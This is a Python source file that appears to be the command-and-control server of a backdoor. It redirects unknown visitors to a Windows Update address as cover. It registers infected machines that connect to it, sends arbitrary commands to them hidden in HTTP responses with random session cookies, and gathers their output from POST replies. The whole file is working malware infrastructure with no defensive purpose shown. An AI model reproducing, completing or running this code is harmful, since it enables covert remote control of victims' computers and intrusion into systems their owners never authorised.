import socket
from RuntimeDatabase import RuntimeDatabase
from HttpResponse import HttpResponse
from HttpRequest import HttpRequest
import threading
import string
import random
from Computer import Computer


class Handler:
    @staticmethod
    def handle_unknown_source(client_sock):
        """
        This function redirects client to official Microsoft website
        :param client_sock: socket for redirection
        :type client_sock: socket
        :return: None
        """
        response = HttpResponse.generate_redirect_response("http://www.windowsupdate.com/")
        client_sock.send(response.encode())
        client_sock.close()

    @staticmethod
    def handle_approved_source(client_sock, addr, request):
        """
        This function check if this is first time connection and handling it
        :param client_sock: socket of client
        :type client_sock: socket
        :param addr: ip address and port
        :type addr: tuple
        :param request: Http request object
        :type request: HttpRequest
        :return: None
        """
        if request.request_method == "GET":

            RuntimeDatabase.idle_connections_lock.acquire()
            if addr[0] in RuntimeDatabase.idle_connections.keys():
                RuntimeDatabase.idle_connections[addr[0]].update_socket(client_sock)
            else:  # New connection
                print("[+] Authentication succeed ->", addr)
                RuntimeDatabase.idle_connections[addr[0]] = Computer(addr[0], client_sock)
            RuntimeDatabase.idle_connections_lock.release()

        if request.request_method == "POST":
            try:  # An other handler waiting for this request
                session_id = request.request_headers['Cookie'].split("=")[1]
                RuntimeDatabase.post_request_events_lock.acquire()
                RuntimeDatabase.post_request_events[session_id].set()
                RuntimeDatabase.post_request_events[session_id] = request
                RuntimeDatabase.post_request_events_lock.release()
            except KeyError:  # Unknown request target
                pass
            client_sock.send(HttpResponse.generate_response(200, "").encode())

    @staticmethod
    def handle_execute_command(ip_address, command):
        """
        This function executes a command on this ip address
        :param ip_address: ip address
        :param command: command for executing
        :type ip_address: str
        :return: Executed successfully
        :rtype: bool
        """
        RuntimeDatabase.idle_connections_lock.acquire()
        client_socket = RuntimeDatabase.idle_connections[ip_address].sock
        RuntimeDatabase.idle_connections_lock.release()
        cookie_value = ''.join(random.choices(string.ascii_uppercase + string.digits, k=4))
        client_socket.send(HttpResponse.generate_response(200, command, set_cookie=cookie_value).encode())
        wait_event = threading.Event()
        RuntimeDatabase.post_request_events_lock.acquire()
        RuntimeDatabase.post_request_events[cookie_value] = wait_event
        RuntimeDatabase.post_request_events_lock.release()
        wait_event.wait(timeout=10)
        if not wait_event.is_set():  # In case that connection lost with remote computer
            print(ip_address, "disconnected")
            RuntimeDatabase.idle_connections_lock.acquire()
            del RuntimeDatabase.idle_connections[ip_address]
            RuntimeDatabase.idle_connections_lock.release()
            return False
        RuntimeDatabase.post_request_events_lock.acquire()
        request = RuntimeDatabase.post_request_events[cookie_value]
        RuntimeDatabase.post_request_events.pop(cookie_value)
        RuntimeDatabase.post_request_events_lock.release()
        print(request.request_content)
        return True
